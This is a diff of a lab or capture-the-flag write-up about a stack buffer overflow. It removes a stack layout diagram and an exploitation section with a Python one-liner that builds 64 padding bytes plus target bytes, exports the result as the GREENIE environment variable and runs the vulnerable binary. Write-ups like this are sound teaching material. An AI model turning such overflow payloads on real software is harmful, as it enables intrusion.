@@ -345,28 +345,6 @@ The exploit succeeds because:
 
 ---
 
-# Stack Layout
-
-Approximate stack layout:
-
-```text
-Higher Addresses
-+----------------------+
-| Return Address       |
-+----------------------+
-| Saved EBP            |
-+----------------------+
-| modified             |
-+----------------------+
-| buffer[64]           |
-+----------------------+
-Lower Addresses
-```
-
-The overflow affects `modified` before reaching the saved frame pointer and return address.
-
----
-
 # Commands Used
 
 ## Static Analysis
@@ -401,34 +379,6 @@ next
 step
 
 continue
-```
-
----
-
-## Exploitation
-
-Run without the environment variable:
-
-```bash
-./bin
-```
-
-Create the payload:
-
-```bash
-python3 -c 'import sys;sys.stdout.buffer.write(b"A"*64+b"\x0a\x0d\x0a\x0d")'
-```
-
-Export the environment variable:
-
-```bash
-export GREENIE=$(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*64+b"\x0a\x0d\x0a\x0d")')
-```
-
-Execute the exploit:
-
-```bash
-./bin
 ```
 
 ---
